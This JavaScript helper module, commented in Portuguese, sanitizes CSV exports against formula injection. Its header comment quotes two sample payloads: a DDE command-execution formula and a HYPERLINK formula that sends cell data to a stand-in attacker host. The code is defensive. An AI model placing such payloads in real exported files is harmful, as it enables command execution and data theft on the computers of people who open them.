/**
 * PRIMETOUR — CSV Safe Export Helper
 *
 * 4.40.21+ (security audit) — Previne CSV formula injection.
 *
 * Vulnerabilidade original: campos exportados em CSV podem começar com
 * `=`, `+`, `-`, `@`, `|`, `%` ou TAB/CR/LF. Quando o arquivo abre no
 * Excel/Google Sheets/LibreOffice, esses caracteres são interpretados
 * como FÓRMULAS — podendo executar comandos do sistema (Excel via
 * `=cmd|'/c calc'!A0`), exfiltrar dados (`=HYPERLINK("http://attacker/?d="&A1,"x")`)
 * ou simplesmente quebrar o arquivo.
 *
 * Como usar:
 *
 *   import { csvCell, csvRow } from '../util/csvSafe.js';
 *
 *   // 1. Por célula:
 *   const safe = csvCell(userInput);   // → '"=cmd"...' vira '\'="cmd"...'
 *
 *   // 2. Por linha (objeto/array):
 *   const lineStr = csvRow([nome, email, comentario]);
 *   // ou
 *   const lineStr = csvRow({ nome, email, comentario }, ['nome','email','comentario']);
 *
 *   // Append BOM pra Excel ler UTF-8 corretamente:
 *   const blob = new Blob(['﻿' + lines.join('\n')], { type: 'text/csv;charset=utf-8;' });
 *
 * Spec: RFC 4180 — campos com aspas/vírgulas/quebra devem ser envoltos em
 * aspas duplas, com aspas internas escapadas como `""`.
 */

const DANGEROUS_PREFIX = /^[=+\-@|%\t\r\n]/;

/**
 * Sanitiza UMA célula do CSV.
 * - Adiciona prefixo `'` se começar com caracter perigoso (neutraliza fórmula no Excel)
 * - Escapa aspas duplas como `""`
 * - Envolve em aspas se contém vírgula, ponto-vírgula, aspas, quebra de linha
 */
export function csvCell(value, { separator = ';' } = {}) {
  if (value == null) return '';
  let str = String(value);

  // Defesa contra formula injection
  if (DANGEROUS_PREFIX.test(str)) {
    str = "'" + str;
  }

  // RFC 4180: escapa aspas + envolve em aspas se contém caracter especial
  const needsQuoting = /["\n\r]/.test(str) || str.includes(separator);
  if (needsQuoting) {
    str = '"' + str.replace(/"/g, '""') + '"';
  }
  return str;
}

/**
 * Gera linha CSV a partir de array ou objeto+keys.
 * @param {Array|Object} cells
 * @param {string[]} [keys]  Se cells é objeto, ordem das chaves a serem extraídas.
 * @param {Object} [opts]
 * @param {string} [opts.separator=';']
 */
export function csvRow(cells, keys, opts = {}) {
  const sep = opts.separator || ';';
  const arr = Array.isArray(cells)
    ? cells
    : (keys || []).map(k => cells?.[k]);
  return arr.map(c => csvCell(c, { separator: sep })).join(sep);
}

/**
 * Helper completo: gera CSV string a partir de array de objetos + headers.
 * Inclui linha de header. Não inclui BOM (caller adiciona se quiser).
 */
export function buildCsv(rows, columns, opts = {}) {
  const sep = opts.separator || ';';
  // columns = [{ key, label }] ou apenas string[] (key === label)
  const cols = columns.map(c => typeof c === 'string' ? { key: c, label: c } : c);
  const headers = cols.map(c => csvCell(c.label, { separator: sep })).join(sep);
  const dataRows = rows.map(r => csvRow(cols.map(c => r[c.key]), null, { separator: sep }));
  return [headers, ...dataRows].join('\n');
}
